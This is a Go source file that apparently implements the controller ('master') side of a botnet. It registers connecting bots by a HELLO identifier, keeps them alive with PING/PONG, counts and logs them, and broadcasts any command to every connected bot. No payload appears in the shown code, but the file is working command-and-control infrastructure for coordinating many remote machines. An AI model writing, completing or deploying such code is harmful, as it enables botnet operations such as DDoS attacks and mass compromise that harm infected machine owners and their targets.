package master

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type BotClient struct {
	ID        string
	Conn      net.Conn
	Connected time.Time
}

type BotManager struct {
	mu           sync.RWMutex
	bots         map[net.Conn]*BotClient
	botCount     int64
	onCountChange func(count int64)
}

func NewBotManager(onCountChange func(count int64)) *BotManager {
	return &BotManager{
		bots:          make(map[net.Conn]*BotClient),
		onCountChange: onCountChange,
	}
}

func (bm *BotManager) GetBotCount() int64 {
	return atomic.LoadInt64(&bm.botCount)
}

func (bm *BotManager) HandleBotConnection(conn net.Conn, initialData []byte) {
	bot := &BotClient{
		ID:        "unknown",
		Conn:      conn,
		Connected: time.Now(),
	}

	bm.mu.Lock()
	bm.bots[conn] = bot
	bm.mu.Unlock()

	count := atomic.AddInt64(&bm.botCount, 1)
	if bm.onCountChange != nil {
		bm.onCountChange(count)
	}

	defer func() {
		bm.mu.Lock()
		delete(bm.bots, conn)
		bm.mu.Unlock()
		_ = conn.Close()

		c := atomic.AddInt64(&bm.botCount, -1)
		if bm.onCountChange != nil {
			bm.onCountChange(c)
		}
		fmt.Printf("[-] Bot disconnected: %s (Total: %d)\n", bot.ID, c)
	}()

	_ = conn.SetReadDeadline(time.Now().Add(45 * time.Second))

	// Process initialData if any
	if len(initialData) > 0 {
		msg := strings.TrimSpace(string(initialData))
		if strings.HasPrefix(msg, "HELLO ") {
			bot.ID = strings.TrimSpace(strings.TrimPrefix(msg, "HELLO "))
			fmt.Printf("[+] Bot connected: %s (Total: %d)\n", bot.ID, atomic.LoadInt64(&bm.botCount))
		}
	}

	reader := bufio.NewReader(conn)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(45 * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		msg := strings.TrimSpace(line)
		if strings.HasPrefix(msg, "HELLO ") {
			bot.ID = strings.TrimSpace(strings.TrimPrefix(msg, "HELLO "))
			fmt.Printf("[+] Bot connected: %s (Total: %d)\n", bot.ID, atomic.LoadInt64(&bm.botCount))
		} else if msg == "PING" {
			_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, _ = conn.Write([]byte("PONG\n"))
		}
	}
}

func (bm *BotManager) BroadcastCommand(cmd string) int {
	bm.mu.RLock()
	defer bm.mu.RUnlock()

	payload := []byte(strings.TrimSpace(cmd) + "\n")
	dispatched := 0

	for conn := range bm.bots {
		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write(payload); err == nil {
			dispatched++
		}
	}

	return dispatched
}
